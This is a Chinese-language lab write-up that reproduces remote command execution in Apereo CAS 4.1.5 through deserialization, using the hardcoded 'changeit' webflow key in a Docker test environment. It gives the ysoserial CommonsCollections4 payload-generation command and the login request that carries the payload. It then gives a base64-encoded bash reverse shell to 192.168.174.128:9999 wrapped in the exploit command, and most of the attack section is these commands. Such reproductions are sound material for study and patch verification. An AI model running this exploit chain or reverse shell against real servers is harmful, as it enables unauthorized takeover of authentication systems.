# Apereo CAS 4.1 反序列化命令执行漏洞

## 环境搭建

执行如下命令启动一个Apereo CAS 4.1.5：

```plain
docker compose up -d
```

环境启动后，访问http://your-ip:8080/cas/login即可查看到登录页面。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803819681-c0b76c21-ff82-4d4d-ba71-c095a1d0e6b0.png)

## 漏洞复现

漏洞原理实际上是Webflow中使用了默认密钥changeit：

```plain
public class EncryptedTranscoder implements Transcoder {
private CipherBean cipherBean;
private boolean compression = true;

public EncryptedTranscoder() throws IOException {
BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec("AES", "CBC", "PKCS7"));
bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());
bufferedBlockCipherBean.setKeyAlias("aes128");
bufferedBlockCipherBean.setKeyPassword("changeit");
bufferedBlockCipherBean.setNonce(new RBGNonce());
this.setCipherBean(bufferedBlockCipherBean);
}

// ...
```

我们使用[Apereo-CAS-Attack](https://github.com/vulhub/Apereo-CAS-Attack#tdsub)来复现这个漏洞。使用ysoserial的CommonsCollections4生成加密后的Payload：

```plain
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/success"
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803820076-6b991a2a-bdd5-4191-8f7a-80c295a6fa80.png)

然后我们登录CAS并抓包，将Body中的execution值替换成上面生成的Payload发送：

```plain
username=test&password=test&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&execution=[payload]&_eventId=submit&submit=LOGIN
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803820520-33eeae7a-bec4-494a-ba79-ac9aa9516beb.png)![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803820948-abc6c821-96e8-4d19-8c2f-c529c7005746.png)

登录Apereo CAS，可见touch /tmp/success已成功执行：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803820820-7dc84d6a-13f4-430e-a7e4-6c3de4956ed5.png)

## 写入反弹shell

构造反弹shell并进行base64编码

```plain
bash -i >& /dev/tcp/192.168.174.128/9999 0>&1  (base64编码)
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx

bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}

java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}"
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803821352-6c7e9dc9-ed60-46fc-acb1-c2001f4ad0bb.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803821825-c1a8ec8c-3e6b-4ce7-a0ad-4858100b3c22.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803821782-35730cc6-5dbb-4982-ad50-44d27fcf347b.png)

监听端口，成功反弹shell:

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803822040-f90fe8e4-5e51-401f-90db-a039f120bab7.png)

# 